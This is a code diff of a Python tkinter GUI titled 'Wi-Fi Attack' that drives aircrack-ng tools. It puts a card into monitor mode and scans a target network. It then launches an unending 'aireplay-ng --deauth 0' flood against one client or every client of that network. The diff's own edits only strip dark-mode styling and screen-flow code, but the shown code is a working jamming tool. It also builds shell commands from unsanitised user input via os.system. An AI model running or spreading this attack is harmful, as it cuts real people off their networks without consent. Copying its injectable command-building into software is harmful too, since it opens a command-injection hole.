@@ -5,19 +5,13 @@ from tkinter import *
 
 root = Tk()
 root.title("Wi-Fi Attack")
-root.configure(bg='black')
-
-def set_dark_mode(widget):
-    widget.configure(bg='black', fg='white')
 
 # network interface-mon
 iwconfig_output = subprocess.check_output(['iwconfig']).decode('utf-8')
 iwconfig_label = Label(root, text=iwconfig_output)
-set_dark_mode(iwconfig_label)
 iwconfig_label.pack()
 
 interface_label = Label(root, text="What is your network interface name?")
-set_dark_mode(interface_label)
 interface_label.pack()
 interface_entry = Entry(root)
 interface_entry.pack()
@@ -26,18 +20,10 @@ def on_monitoring_click():
     interface = interface_entry.get()
     os.system('airmon-ng start ' + interface)
     os.system('airmon-ng check kill ' + interface)
-    monitoring_button.pack_forget()
-    monitoring_label.pack_forget()
-    interface_entry.pack_forget()
-    interface_label.pack_forget()
-    bssid_label.pack()
-    bssid_entry.pack()
-    bssid_help_button.pack()
 
 monitoring_label = Label(root, text="Do you want the network change to Monitor?")
-set_dark_mode(monitoring_label)
 monitoring_label.pack()
-monitoring_button = Button(root, text="Next", command=on_monitoring_click)
+monitoring_button = Button(root, text="Yes", command=on_monitoring_click)
 monitoring_button.pack()
 
 def scan_wifi():
@@ -47,7 +33,7 @@ def scan_wifi():
     os.system("pkill airodump-ng") # Stop airodump-ng after 1 seconds
 
 bssid_label = Label(root, text="Enter the BSSID of the Wi-Fi:")
-set_dark_mode(bssid_label)
+bssid_label.pack()
 bssid_entry = Entry(root)
 bssid_entry.pack()
 
@@ -62,15 +48,9 @@ def find_ch():
     ch = ch_entry.get()
     interface = interface_entry.get()
     os.system(f"airodump-ng --bssid {bssid} -c {ch} " + interface) # final scan
-    bssid_help_button.pack_forget()
-    bssid_entry.pack_forget()
-    bssid_label.pack_forget()
-    ch_label.pack()
-    ch_entry.pack()
-    ch_help_button.pack()
 
 ch_label = Label(root, text="Enter the channel of the Wi-Fi:")
-set_dark_mode(ch_label)
+ch_label.pack()
 ch_entry = Entry(root)
 ch_entry.pack()
 
@@ -91,14 +71,9 @@ def attack():
         os.system(f"aireplay-ng --deauth 0 -a {bssid} -c {destination} {interface}")
     else:
         os.system(f"aireplay-ng --deauth 0 -a {bssid} {interface}")
-        
-def next_step():
-    ch_help_button.pack_forget()
-    ch_entry.pack_forget()
-    ch_label.pack_forget()
-    
+
 destination_label = Label(root, text="Enter the Wi-Fi client essid (leave blank for broadcast attack):")
-set_dark_mode(destination_label)
+destination_label.pack()
 destination_entry = Entry(root)
 destination_entry.pack()
 
